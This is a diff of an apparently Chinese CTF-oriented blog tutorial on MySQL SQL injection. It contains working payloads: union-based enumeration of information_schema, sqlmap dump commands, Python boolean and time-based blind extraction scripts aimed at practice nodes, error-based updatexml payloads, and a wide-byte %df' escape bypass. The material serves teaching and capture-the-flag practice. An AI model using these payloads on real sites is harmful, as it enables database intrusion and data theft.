@@ -290,25 +290,31 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><ul>
-<li><p>以MySQL 5.7为例，对于一个新安装好的MySQL数据库，至少会包含三个已经建立好的数据库分别是<code>user</code>、<code>information_schema</code>、<code>performance_schema</code></p>
+			<h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入">#</a> SQL 注入</h1>
+<h2 id="数据库基础"><a class="markdownIt-Anchor" href="#数据库基础">#</a> 数据库基础</h2>
+<ul>
+<li>
+<p>以 MySQL 5.7 为例，对于一个新安装好的 MySQL 数据库，至少会包含三个已经建立好的数据库分别是 <code>user</code> 、 <code>information_schema</code> 、 <code>performance_schema</code></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/1448672-20190919203658089-195934788.png"
                       alt="img"
                 ></p>
-<p>这些系统数据库中存储了MySQL的各个数据以及用户信息，而SQL注入就是通过绕过过滤利用这些系统表进行查询提取得到密码信息。</p>
+<p>这些系统数据库中存储了 MySQL 的各个数据以及用户信息，而 SQL 注入就是通过绕过过滤利用这些系统表进行查询提取得到密码信息。</p>
 </li>
-<li><p>常用的SQL注入语句</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show databases # 列出所有数据库</span><br><span class="line">use test # 进入test数据库</span><br><span class="line">show tables # 列出当前数据库下所有表</span><br><span class="line">create table users (</span><br><span class="line">    id int not null primary key auto_increment,</span><br><span class="line">    username varchar(32) not null,</span><br><span class="line">    password varchar(32) not null</span><br><span class="line">) # 建表</span><br><span class="line">insert into users(username, password) values(&#x27;admin&#x27;, &#x27;admin&#x27;) # 增</span><br><span class="line">delete from users where username=&#x27;admin&#x27; # 删</span><br><span class="line">update users set password=&#x27;admin&#x27; where username=&#x27;admin&#x27; # 改</span><br><span class="line">select id from users where username=&#x27;admin&#x27; and password = &#x27;admin&#x27; # 查</span><br></pre></td></tr></table></figure></div></li>
+<li>
+<p>常用的 SQL 注入语句</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show databases # 列出所有数据库</span><br><span class="line">use test # 进入test数据库</span><br><span class="line">show tables # 列出当前数据库下所有表</span><br><span class="line">create table users (</span><br><span class="line">    id int not null primary key auto_increment,</span><br><span class="line">    username varchar(32) not null,</span><br><span class="line">    password varchar(32) not null</span><br><span class="line">) # 建表</span><br><span class="line">insert into users(username, password) values(&#x27;admin&#x27;, &#x27;admin&#x27;) # 增</span><br><span class="line">delete from users where username=&#x27;admin&#x27; # 删</span><br><span class="line">update users set password=&#x27;admin&#x27; where username=&#x27;admin&#x27; # 改</span><br><span class="line">select id from users where username=&#x27;admin&#x27; and password = &#x27;admin&#x27; # 查</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
-<p>常用的SQL术语</p>
+<p>常用的 SQL 术语</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字段：每个变量叫做字段</span><br><span class="line">列： 多个字段</span><br><span class="line">行：一个数据行简称一行</span><br><span class="line">结果集：SQL查询中的最终数据结果</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><ul>
-<li><p>通过上面的方法知道了注入类型之后，我们便可以进行下一步的操作了，这里我们以联合注入为例，来学习MySQL注入的过程</p>
-<p>联合注入是一种在MySQL中进行使用的方式，本质就是利用了MySQL的<code>union</code>关键字将前后两个结果集进行合并输出，这样便可以在正常的查询中带出我们的查询内容。</p>
+<h2 id="联合注入"><a class="markdownIt-Anchor" href="#联合注入">#</a> 联合注入</h2>
+<ul>
+<li>
+<p>通过上面的方法知道了注入类型之后，我们便可以进行下一步的操作了，这里我们以联合注入为例，来学习 MySQL 注入的过程</p>
+<p>联合注入是一种在 MySQL 中进行使用的方式，本质就是利用了 MySQL 的 <code>union</code>  关键字将前后两个结果集进行合并输出，这样便可以在正常的查询中带出我们的查询内容。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -327,66 +333,76 @@
 <p>下面我们便从查列数开始学习联合注入的过程</p>
 </li>
 </ul>
-<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><ul>
-<li><p>对于一般的SQL查询语句，有字符型和数值型查询，而每种里面又可以继续细分为盲注、爆错注入、二次注入等等具体的注入方式。</p>
+<h2 id="判断注入类型"><a class="markdownIt-Anchor" href="#判断注入类型">#</a> 判断注入类型</h2>
+<ul>
+<li>
+<p>对于一般的 SQL 查询语句，有字符型和数值型查询，而每种里面又可以继续细分为盲注、爆错注入、二次注入等等具体的注入方式。</p>
 <p>如何判断注入类型呢，我们可以通过不同的字符串拼接并通过回显来判断具体类型。</p>
 </li>
 </ul>
-<h3 id="查列数"><a href="#查列数" class="headerlink" title="查列数"></a>查列数</h3><ul>
-<li><p>查列数即查结果集列中字段的数量，在联合注入中，这是很重要的一步，可以尝试下列语句</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select 1,2,3 # ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">select 1,2 union select 1,2</span><br></pre></td></tr></table></figure></div></li>
+<h3 id="查列数"><a class="markdownIt-Anchor" href="#查列数">#</a> 查列数</h3>
+<ul>
+<li>
+<p>查列数即查结果集列中字段的数量，在联合注入中，这是很重要的一步，可以尝试下列语句</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select 1,2,3 # ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">select 1,2 union select 1,2</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
-<p>可以发现第一句会报错，这是因为前后两个结果集有不同的列数，所以在SQL注入中，我们最终的语句会拼接成</p>
+<p>可以发现第一句会报错，这是因为前后两个结果集有不同的列数，所以在 SQL 注入中，我们最终的语句会拼接成</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxx,xxx, from xxx where xxx=xxx union select xxx,xxx</span><br></pre></td></tr></table></figure></div>
-
 <p>我们必须知道前面结果集的列数这样才能在后面构造正常的数目。</p>
-<p>一般我们使用<code>order by</code>来查询列数。</p>
-<p><code>order by</code>是用来给数据排序的一个关键字，使用方法如下</p>
+<p>一般我们使用 <code>order by</code>  来查询列数。</p>
+<p><code>order by</code>  是用来给数据排序的一个关键字，使用方法如下</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by username # 按照username列排升序</span><br><span class="line">select * from users order by 2 # 按照第2列排升序</span><br><span class="line">select * from users order by 2 desc # 按照第二列排降序</span><br></pre></td></tr></table></figure></div>
-
-
-
-
-
 <p>这里我们主要注意第二种使用方法，例如尝试使用下面语句</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 10 # ERROR 1054 (42S22): Unknown column &#x27;10&#x27; in &#x27;order clause</span><br></pre></td></tr></table></figure></div>
-
 <ul>
-<li>提示未知的第10列，我们要做的就是利用报错来查询列数。</li>
+<li>提示未知的第 10 列，我们要做的就是利用报错来查询列数。</li>
 </ul>
-<h3 id="确定字段位置"><a href="#确定字段位置" class="headerlink" title="确定字段位置"></a>确定字段位置</h3><ul>
-<li><p>在获得了表的列数之后，就可以通过联合查询来获取数据库信息了，但在此之前，我们还需要确定每个字段显示在网页上的位置，方便后面查看数据，当然这一步并不是必须的，大部分做题的时候，通过只显示一个字段或我们可以通过猜测来确定字段的位置。</p>
+<h3 id="确定字段位置"><a class="markdownIt-Anchor" href="#确定字段位置">#</a> 确定字段位置</h3>
+<ul>
+<li>
+<p>在获得了表的列数之后，就可以通过联合查询来获取数据库信息了，但在此之前，我们还需要确定每个字段显示在网页上的位置，方便后面查看数据，当然这一步并不是必须的，大部分做题的时候，通过只显示一个字段或我们可以通过猜测来确定字段的位置。</p>
 <p>做法很简单，我们通过联合上一个所有内容都不同的结果集再根据页面数据判断位置即可。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></div></li>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
 <p>值得注意的是，当页面只会显示一行数据时候，需要先拼上一个恒假的条件让前面的结果集没有输入从而数据我们的内容，不然如果前面有数据的话我们的结果集永远得不到输出。</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h3><ul>
-<li><p>当完成了上述步骤之后，就可以进一步的查询数据库信息了，在查询表名之前，我们先来查询一些其他数据库信息。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database() # 查看当前数据库</span><br><span class="line">version() # 查看数据库版本信息</span><br><span class="line">user() # 查看当前数据库连接的用户</span><br></pre></td></tr></table></figure></div></li>
+<h3 id="查表名"><a class="markdownIt-Anchor" href="#查表名">#</a> 查表名</h3>
+<ul>
+<li>
+<p>当完成了上述步骤之后，就可以进一步的查询数据库信息了，在查询表名之前，我们先来查询一些其他数据库信息。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database() # 查看当前数据库</span><br><span class="line">version() # 查看数据库版本信息</span><br><span class="line">user() # 查看当前数据库连接的用户</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
 <p>查询方式就是将函数放在字段的位置，然后通过上一步就可以知道最终会在哪里输出了</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,database(), user(),3,4,5</span><br></pre></td></tr></table></figure></div>
-
-<p>进一步的我们可以获取数据库中其他数据表的名字，这需要利用到我们最开始所提及的系统数据库，在<code>information_schema.tables</code>中存储了其他数据表的内容，我们可以通过查询此表中的数据来得到表名</p>
+<p>进一步的我们可以获取数据库中其他数据表的名字，这需要利用到我们最开始所提及的系统数据库，在 <code>information_schema.tables</code>  中存储了其他数据表的内容，我们可以通过查询此表中的数据来得到表名</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;test&#x27;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><ul>
-<li><p>或者叫查字段名，我们已经获得了表名之后，接下来就是获取具体的字段名了，我们需要使用到<code>information_schema.columns</code>这张表</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;xxx&#x27;</span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><ul>
-<li><p>在表名，列名都得到了的基础之上，我们就可以轻松的进行读取数据了</p>
+<h3 id="查列名"><a class="markdownIt-Anchor" href="#查列名">#</a> 查列名</h3>
 <ul>
-<li><p>涉及的payload</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; --dbs # 查询所有数据库</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test --tables # 查询test数据库下所有表</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test --schema # 查询test数据库下所有表结构</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test -T f1ag_table --column # 查询test数据库中f1ag_table表的列</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test -T f1ag_table --dump # 获取f1ag_table表的内容</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/&quot; --data &quot;id=1&quot; --dbs # 传输POST参数</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/&quot; --all # 获取所有信息</span><br></pre></td></tr></table></figure></div></li>
+<li>
+<p>或者叫查字段名，我们已经获得了表名之后，接下来就是获取具体的字段名了，我们需要使用到 <code>information_schema.columns</code>  这张表</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;xxx&#x27;</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<h3 id="获取数据"><a class="markdownIt-Anchor" href="#获取数据">#</a> 获取数据</h3>
+<ul>
+<li>
+<p>在表名，列名都得到了的基础之上，我们就可以轻松的进行读取数据了</p>
+<ul>
+<li>
+<p>涉及的 payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; --dbs # 查询所有数据库</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test --tables # 查询test数据库下所有表</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test --schema # 查询test数据库下所有表结构</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test -T f1ag_table --column # 查询test数据库中f1ag_table表的列</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/?id=1&amp;username=1&quot; -D test -T f1ag_table --dump # 获取f1ag_table表的内容</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/&quot; --data &quot;id=1&quot; --dbs # 传输POST参数</span><br><span class="line">python sqlmap.py -u &quot;https://xxx/&quot; --all # 获取所有信息</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
 </li>
 </ul>
 <p>\4. 布尔盲注和时间盲注</p>
-<h2 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h2><ul>
-<li><p>上面我们学习了最基本的SQL注入方案，联合查询，这种方案能够生效的前提是页面能够给出回显内容，如果SQL查询完成之后页面不会给出查询的结果，那么我们即使完成了SQL注入也没法得到消息，这时候就需要使用无回显盲注来进行SQL注入</p>
+<h2 id="无回显盲注"><a class="markdownIt-Anchor" href="#无回显盲注">#</a> 无回显盲注</h2>
+<ul>
+<li>
+<p>上面我们学习了最基本的 SQL 注入方案，联合查询，这种方案能够生效的前提是页面能够给出回显内容，如果 SQL 查询完成之后页面不会给出查询的结果，那么我们即使完成了 SQL 注入也没法得到消息，这时候就需要使用无回显盲注来进行 SQL 注入</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -395,85 +411,82 @@
                 ></p>
 <p>盲注可以根据回显情况分为两种类型，一种是页面有部分回显的，例如返回登录是否成功，一种是没有任何回显的，我们可以分为</p>
 <ol>
-<li>bool盲注</li>
+<li>bool 盲注</li>
 <li>时间盲注</li>
 </ol>
 </li>
 </ul>
-<h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><ul>
-<li><p>bool盲注即利用页面的有限回显信息来进行注入，那么我们的信息如何被带出来呢？我们可以利用每次注入返回一个bool消息来进行判断信息，例如：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=1+if(substr((select database()), 1, 1)=&#x27;r&#x27;, 1, 0)</span><br></pre></td></tr></table></figure></div></li>
+<h3 id="bool盲注"><a class="markdownIt-Anchor" href="#bool盲注">#</a> bool 盲注</h3>
+<ul>
+<li>
+<p>bool 盲注即利用页面的有限回显信息来进行注入，那么我们的信息如何被带出来呢？我们可以利用每次注入返回一个 bool 消息来进行判断信息，例如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=1+if(substr((select database()), 1, 1)=&#x27;r&#x27;, 1, 0)</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
-<p>如果<code>id</code>为1和2会返回不同的界面，那么我们就可以通过显示的界面来判断database名字的第一位是不是<code>r</code>，同理可以对其他位置进行判断。</p>
+<p>如果 <code>id</code>  为 1 和 2 会返回不同的界面，那么我们就可以通过显示的界面来判断 database 名字的第一位是不是 <code>r</code> ，同理可以对其他位置进行判断。</p>
 <p>因为此类方式需要大量的判断才能得到正确的信息，所以我们一般使用脚本来执行我们的操作</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28411/&#x27; #url</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    l,r = 32, 127</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l+r) // 2</span><br><span class="line">        # where id = 1</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select user()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;f1ag_table\&#x27;), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        payload = f&#x27;2-if(ascii(substr((select group_concat(i_am_f1ag_column) from f1ag_table), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        res = requests.get(url, params=&#123;</span><br><span class="line">            &#x27;id&#x27;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        if &quot;id = 1&quot; in res.text: # 判断回显信息</span><br><span class="line">            r = mid</span><br><span class="line">        else:</span><br><span class="line">            l = mid+1</span><br><span class="line">    flag += chr(l)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul>
-<li><p>时间盲注和bool盲注类似，但是如果页面任何可以利用的都没有的话，我们就无法直接得到bool信息了，所以我们可以通过延时的方式来制作一个bool信息</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=1+if(substr((select database()), 1, 1)=&#x27;r&#x27;, sleep(3), 0)</span><br></pre></td></tr></table></figure></div></li>
+<h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注">#</a> 时间盲注</h3>
+<ul>
+<li>
+<p>时间盲注和 bool 盲注类似，但是如果页面任何可以利用的都没有的话，我们就无法直接得到 bool 信息了，所以我们可以通过延时的方式来制作一个 bool 信息</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=1+if(substr((select database()), 1, 1)=&#x27;r&#x27;, sleep(3), 0)</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
-<p>如果你发现页面响应时间大于3秒，这时候就可以确定database的首位是<code>r</code>了，同理对其他数据进行读取。</p>
+<p>如果你发现页面响应时间大于 3 秒，这时候就可以确定 database 的首位是 <code>r</code>  了，同理对其他数据进行读取。</p>
 <p>同样，我们使用脚本来进行操作</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://node4.anna.nssctf.cn:28690/&#x27; #url</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    l,r = 32, 127</span><br><span class="line">    while l &lt; r:</span><br><span class="line">        mid = (l+r) // 2</span><br><span class="line">        # where id = 1</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select user()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        # payload = f&#x27;2-if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#x27;f1ag_table\&#x27;), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, 1, 0)&#x27;</span><br><span class="line">        payload = f&#x27;2-if(ascii(substr((select group_concat(i_am_f1ag_column) from f1ag_table), &#123;i&#125;, 1))&lt;=&#123;mid&#125;, sleep(1), 0)&#x27;</span><br><span class="line">        res = requests.get(url, params=&#123;</span><br><span class="line">            &#x27;id&#x27;: payload</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        if res.elapsed.total_seconds() &gt; 1.:</span><br><span class="line">            r = mid</span><br><span class="line">        else:</span><br><span class="line">            l = mid+1</span><br><span class="line">    flag += chr(l)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></div>
-
-<p>\5. 报错注入&amp;宽字节注入</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
-<li><p>当页面会给出报错信息的时候，我们使用利用这些报错信息带出我们的查询内容</p>
+<p>\5. 报错注入 &amp; 宽字节注入</p>
+<h2 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入">#</a> 报错注入</h2>
+<ul>
+<li>
+<p>当页面会给出报错信息的时候，我们使用利用这些报错信息带出我们的查询内容</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/899bee6fc5.jpeg"
                       alt="NSS图片"
                 ></p>
-<p>除了<code>updatexml</code>外还可以使用<code>extractvalue</code>进行使用，例如</p>
+<p>除了 <code>updatexml</code>  外还可以使用 <code>extractvalue</code>  进行使用，例如</p>
 <p><code>extractvalue(null, concat(0x7e, (select user())))</code></p>
-<p>图片上的不对应该是7e    73出来是@会有一些缺失</p>
+<p>图片上的不对应该是 7e    73 出来是 @会有一些缺失</p>
 </li>
 </ul>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><ul>
-<li><p>当mysql使用GBK编码，但是链接的容器并没有声明编码时，可以用此方法绕过过滤函数</p>
-<p><code>mysqli_real_escape_string</code>会将参数内特殊字符前加上转译符，这样便可以防止SQL注入</p>
-<p>但是如果没有声明<code>gbk</code>编码时，对于大于<code>128</code>的ASCII码并不会认为是特殊字符。</p>
+<h2 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入">#</a> 宽字节注入</h2>
+<ul>
+<li>
+<p>当 mysql 使用 GBK 编码，但是链接的容器并没有声明编码时，可以用此方法绕过过滤函数</p>
+<p><code>mysqli_real_escape_string</code>  会将参数内特殊字符前加上转译符，这样便可以防止 SQL 注入</p>
+<p>但是如果没有声明 <code>gbk</code>  编码时，对于大于 <code>128</code>  的 ASCII 码并不会认为是特殊字符。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/7370358c41.jpeg"
                       alt="NSS图片"
                 ></p>
-<p>这样我们输入的<code>%df&#39;</code>，经过<code>mysqli_real_escape_string</code>函数后会变成<code>%df\&#39;</code>,但是在mysql中，因为是gbk编码，会将<code>%df\</code>看作一个汉字<code>運</code>，这样我们的单引号便逃逸了出来。</p>
+<p>这样我们输入的 <code>%df'</code> ，经过 <code>mysqli_real_escape_string</code>  函数后会变成 <code>%df\'</code> , 但是在 mysql 中，因为是 gbk 编码，会将 <code>%df\</code>  看作一个汉字 <code>運</code> ，这样我们的单引号便逃逸了出来。</p>
 </li>
 </ul>
 <p>\6. 堆叠注入</p>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
-<li><p>也叫多行注入，当代码允许多行查询时候使用，一般是在select等关键字被过滤的时候进行使用的。</p>
-<p>对于堆叠注入，我们一般使用两种方式进行绕过select</p>
+<h2 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入">#</a> 堆叠注入</h2>
+<ul>
+<li>
+<p>也叫多行注入，当代码允许多行查询时候使用，一般是在 select 等关键字被过滤的时候进行使用的。</p>
+<p>对于堆叠注入，我们一般使用两种方式进行绕过 select</p>
 <ol>
 <li>查表</li>
 </ol>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from table;</span><br></pre></td></tr></table></figure></div></li>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from table;</span><br></pre></td></tr></table></figure></div>
+</li>
 </ul>
 <ol>
-<li>Handler使用</li>
+<li>Handler 使用</li>
 </ol>
